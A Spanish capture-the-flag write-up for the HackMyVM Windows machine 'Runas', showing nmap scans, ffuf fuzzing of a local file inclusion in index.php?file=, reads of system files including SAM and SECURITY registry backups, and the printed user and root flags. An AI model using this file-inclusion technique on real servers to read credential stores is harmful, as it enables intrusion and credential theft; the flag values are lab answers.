---
icon: flag
---

# Runas HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-30 03:11 EDT
Nmap scan report for 192.168.1.162
Host is up (0.00033s latency).

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Apache httpd 2.4.57 ((Win64) PHP/7.2.0)
|_http-title: Index of /
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64) PHP/7.2.0
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  closed ms-wbt-server
5357/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp open   msrpc         Microsoft Windows RPC
49158/tcp open   msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:5A:0A:A1 (Oracle VirtualBox virtual NIC)
Service Info: Host: RUNAS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: runas-PC
|   NetBIOS computer name: RUNAS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-30T10:12:26+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-30T07:12:26
|_  start_date: 2025-03-30T07:09:26
|_clock-skew: mean: -59m57s, deviation: 1h43m54s, median: 1s
|_nbstat: NetBIOS name: RUNAS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5a:0a:a1 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.09 seconds
```

Si entramos en la pagina del puerto `80` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta indicando algo con `file=` lo que podemos deducir que puede ser un parametro para leer archivos en el `index.php`, por lo que podriamos realizar un `LFI`.

```
URL = http://<IP>/index.php?file=styles.css
```

Veremos que nos muestra el archivo:

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

Pero vamos a probar a realizar un poco de `fuzzing` para ver que rutas encontramos.

## FFUF

```shell
ffuf -u 'http://<IP>/index.php?file=FUZZ' -w <WORDLIST> -fs 429
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.162/index.php?file=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/LFIWindowsList/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 429
________________________________________________

C:/Users/Administrator/NTUser.dat [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 4ms]
C:/Windows/win.ini      [Status: 200, Size: 1042, Words: 103, Lines: 46, Duration: 1ms]
C:/Windows/system32/config/regback/default [Status: 200, Size: 631, Words: 84, Lines: 20, Duration: 0ms]
C:/Windows/system32/config/regback/sam [Status: 200, Size: 627, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/system32/config/regback/security [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 0ms]
C:/Windows/system32/config/regback/system [Status: 200, Size: 630, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/system32/config/regback/software [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 58608, Words: 8247, Lines: 599, Duration: 1ms]
c:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 1ms]
c:/PHP/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 3ms]
C:/WINDOWS/Repair/SAM   [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 29ms]
C:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 33ms]
C:/Windows/repair/system [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 63ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 65ms]
C:/Windows/System32/inetsrv/config/applicationHost.config [Status: 200, Size: 79253, Words: 12108, Lines: 821, Duration: 63ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 946, Words: 171, Lines: 34, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4760, Words: 774, Lines: 97, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 1973, Words: 539, Lines: 45, Duration: 2ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 108084, Words: 8722, Lines: 1171, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 12ms]
c:/WINDOWS/setuperr.log [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 12ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19622, Words: 8783, Lines: 303, Duration: 14ms]
c:/WINDOWS/setupact.log [Status: 200, Size: 25712, Words: 2474, Lines: 314, Duration: 17ms]
:: Progress: [236/236] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Vemos las rutas que si sirven en este caso, tambien estamos viendo que esta accediendo a rutas de `Administradores` por lo que podemos pensar que puede tener algun tipo de privilegio el usuario que esta ejecutando esta lectura de archivos.

Si estas rutas las probamos algunas nos van a ir, pero otras no, por lo que vamos a seguir descartanto un poco mas:

```shell
ffuf -u 'http://<IP>/index.php?file=FUZZ' -w <WORDLIST> -fs 429 -fw 68
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.162/index.php?file=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/LFIWindowsList/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 429
 :: Filter           : Response words: 68
________________________________________________

C:/Windows/system32/config/regback/default [Status: 200, Size: 631, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/system32/config/regback/sam [Status: 200, Size: 627, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/system32/config/regback/security [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 0ms]
C:/Windows/system32/config/regback/system [Status: 200, Size: 630, Words: 84, Lines: 20, Duration: 0ms]
C:/Windows/system32/config/regback/software [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 1ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 58608, Words: 8247, Lines: 599, Duration: 1ms]
c:/PHP/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 1ms]
C:/Windows/win.ini      [Status: 200, Size: 1042, Words: 103, Lines: 46, Duration: 42ms]
C:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 56ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 43ms]
C:/Windows/System32/inetsrv/config/applicationHost.config [Status: 200, Size: 79253, Words: 12108, Lines: 821, Duration: 35ms]
c:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 64ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4760, Words: 774, Lines: 97, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 946, Words: 171, Lines: 34, Duration: 0ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 1973, Words: 539, Lines: 45, Duration: 1ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19622, Words: 8783, Lines: 303, Duration: 1ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 108084, Words: 8722, Lines: 1171, Duration: 2ms]
c:/WINDOWS/setupact.log [Status: 200, Size: 25712, Words: 2474, Lines: 314, Duration: 18ms]
:: Progress: [236/236] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Habiendo echo un segundo filtro, veremos que estas si las probamos todas nos van a mostrar el contenido del archivo.

Pero no nos servira de mucho, lo que si podemos probar es a intentar ver las `flags` del usuario que suponemos que se llamara `runas` por como se llama la maquina y el del `administrador`.

> user.txt

```
URL = http://<IP>/index.php?file=C:\Users\runas\Desktop\user.txt
```

Info:

```
HMV{User_Flag_Was_A_Bit_Bitter}
```

> root.txt

```
URL = http://<IP>/index.php?file=C:/Users/Administrator/Desktop/root.txt
```

Info:

```
HMV{Username_Is_My_Hint}
```

Y con esto ya habremos terminado la maquina.
